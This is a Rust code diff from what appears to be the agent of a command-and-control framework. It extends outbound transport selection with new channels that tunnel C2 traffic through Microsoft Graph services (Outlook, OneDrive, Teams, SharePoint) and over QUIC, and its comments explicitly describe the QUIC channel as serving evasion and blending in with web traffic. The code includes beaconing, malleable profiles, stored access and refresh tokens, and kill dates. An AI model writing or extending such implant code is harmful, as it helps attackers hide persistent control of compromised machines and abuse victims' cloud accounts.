@@ -33,7 +33,7 @@ use common::normalized_transport::{NormalizedTransport, Role, TrafficProfile};
 use common::tls_transport::{PinnedCertVerifier, TlsTransport};
 use common::{LockedSecret, Message, Transport};
 use ed25519_dalek::SigningKey;
-use log::{error, info, warn};
+use tracing::{error, info, warn};
 use rand::rngs::OsRng;
 use rustls::ClientConfig;
 use std::sync::Arc;
@@ -191,9 +191,12 @@ fn build_tls_client_config(
 ///
 /// Priority order:
 ///   1. SSH transport  (`ssh-transport`  feature + `ssh_host` configured)
-///   2. DoH transport  (`doh-transport`  feature + `dns_over_https = true`)
-///   3. HTTP transport (`http-transport` feature + `cdn_relay = true`)
-///   4. Direct TLS connection (always-available fallback)
+///   2. SMB transport  (`smb-pipe-transport` feature + `smb_pipe_enabled`)
+///   3. DoH transport  (`doh-transport`  feature + `dns_over_https = true`)
+///   4. HTTP transport (`http-transport` feature + `cdn_relay = true`)
+///   5. Graph transport (`graph-transport` feature + `c2_graph.enabled`)
+///   6. QUIC transport (`quic-transport` feature + `c2_quic.enabled`)
+///   7. Direct TLS connection (always-available fallback)
 ///
 /// Extracting this logic out of [`connect_once`] makes the transport selection
 /// reusable: any startup path (outbound-c, future inbound mode, tests) can
@@ -213,7 +216,9 @@ pub async fn build_outbound_transport(
         feature = "ssh-transport",
         feature = "smb-pipe-transport",
         feature = "doh-transport",
-        feature = "http-transport"
+        feature = "http-transport",
+        feature = "graph-transport",
+        feature = "quic-transport"
     ))]
     {
         match config_result.as_ref() {
@@ -308,12 +313,11 @@ pub async fn build_outbound_transport(
                         "doh-transport: dns_over_https=true, server_url={}; switching to DohTransport",
                         server_url
                     );
-                    let session = common::CryptoSession::from_shared_secret(secret.as_bytes());
                     let agent_profile = malleable_profile_from_config(cfg);
                     return Ok(Box::new(
                         crate::c2_doh::DohTransport::new(
                             &agent_profile,
-                            session,
+                            secret,
                             agent_id.to_string(),
                             Some(&cfg.malleable_profile), // legacy config for host_header, doh_beacon_sentinel
                         )
@@ -330,12 +334,11 @@ pub async fn build_outbound_transport(
                 if cfg.malleable_profile.cdn_relay {
                     let agent_id = _agent_id;
                     info!("http-transport: cdn_relay=true; switching to HttpTransport");
-                    let session = common::CryptoSession::from_shared_secret(secret.as_bytes());
                     let agent_profile = malleable_profile_from_config(cfg);
                     return Ok(Box::new(
                         crate::c2_http::HttpTransport::new(
                             Some(&agent_profile),
-                            session,
+                            secret,
                             agent_id.to_string(),
                             _mesh_public_key,
                             Some(&cfg.malleable_profile),
@@ -344,6 +347,72 @@ pub async fn build_outbound_transport(
                         )
                         .await
                         .map_err(|e| anyhow!("HttpTransport init failed: {e}"))?,
+                    ));
+                }
+
+                // Graph transport: tunnel C2 messages through Microsoft Graph
+                // API (Outlook, OneDrive, Teams, or SharePoint channels).
+                // Requires the `graph-transport` feature and an enabled
+                // `[c2_graph]` section in the malleable profile with valid
+                // Entra ID credentials.
+                #[cfg(feature = "graph-transport")]
+                if cfg.malleable_profile.c2_graph.enabled {
+                    let agent_id = _agent_id;
+                    info!(
+                        "graph-transport: c2_graph.enabled=true, channel={}; \
+                         switching to GraphTransport",
+                        cfg.malleable_profile.c2_graph.channel
+                    );
+                    let session = common::CryptoSession::from_shared_secret(secret.as_bytes());
+                    let g = &cfg.malleable_profile.c2_graph;
+                    let graph_config = crate::c2_graph::GraphC2Config {
+                        enabled: true,
+                        channel: g.channel.clone(),
+                        client_id: g.client_id.clone(),
+                        tenant_id: g.tenant_id.clone(),
+                        access_token: g.access_token.clone(),
+                        refresh_token: g.refresh_token.clone(),
+                        beacon_folder: g.beacon_folder.clone(),
+                        polling_interval_secs: g.polling_interval_secs,
+                        teams_chat_id: g.teams_chat_id.clone(),
+                        sharepoint_site_id: g.sharepoint_site_id.clone(),
+                        sharepoint_list_id: g.sharepoint_list_id.clone(),
+                        government_cloud: g.government_cloud,
+                        custom_graph_url: None,
+                        max_file_size_bytes: 4 * 1024 * 1024, // 4 MB default
+                        kill_date: String::new(), // kill_date handled at transport level
+                        psk: g.psk.clone(),
+                    };
+                    return Ok(Box::new(
+                        crate::c2_graph::GraphTransport::new(graph_config, session, agent_id.to_string())
+                            .map_err(|e| anyhow!("GraphTransport init failed: {e}"))?,
+                    ));
+                }
+
+                // QUIC transport: tunnel C2 messages over QUIC (HTTP/3) for
+                // UDP-based evasion.  QUIC provides NAT traversal, connection
+                // migration, and blends with modern web traffic on port 443/udp.
+                // Requires the `quic-transport` feature and an enabled
+                // `[c2_quic]` section in the malleable profile.
+                #[cfg(feature = "quic-transport")]
+                if cfg.malleable_profile.c2_quic.enabled {
+                    let agent_id = _agent_id;
+                    info!(
+                        "quic-transport: c2_quic.enabled=true, endpoint={}; \
+                         switching to QuicTransport",
+                        cfg.malleable_profile.c2_quic.endpoint
+                    );
+                    let session = common::CryptoSession::from_shared_secret(secret.as_bytes());
+                    return Ok(Box::new(
+                        crate::c2_quic::QuicTransport::new(
+                            &cfg.malleable_profile.c2_quic,
+                            session,
+                            agent_id.to_string(),
+                            _mesh_public_key,
+                            cfg.kill_date.clone(),
+                            &cfg.malleable_profile.c2_quic.psk,
+                        )
+                        .map_err(|e| anyhow!("QuicTransport init failed: {e}"))?,
                     ));
                 }
             }
@@ -607,7 +676,7 @@ pub async fn run_forever() -> Result<()> {
         // backoff to avoid a tight reconnection loop.
         let session_duration = session_start.elapsed();
         if session_duration < MIN_SESSION_DURATION {
-            log::warn!(
+            tracing::warn!(
                 "outbound: session lasted only {:?}, applying session backoff {:?}",
                 session_duration,
                 session_backoff
